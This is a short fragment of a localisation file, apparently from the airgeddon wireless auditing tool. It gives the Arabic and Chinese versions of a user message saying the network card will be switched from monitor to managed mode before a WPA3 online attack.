	arr["ARABIC","wpa3_online_attack_5"]="تلقائيًا لتتمكن من تنفيذ الهجوم airgeddon لذلك سيغيرها ,\"Monitor\" تم اكتشاف أن شريحتك في وضع .\"Managed\" لبدء هذا الهجوم ، يجب أن تكون الشريحتك في وضع"
	arr["CHINESE","wpa3_online_attack_5"]="要发起此攻击，该卡必须处于“管理”模式。检测到您的卡处于“监听”模式，因此 airgeddon 会自动更改它以能够进行攻击"
}
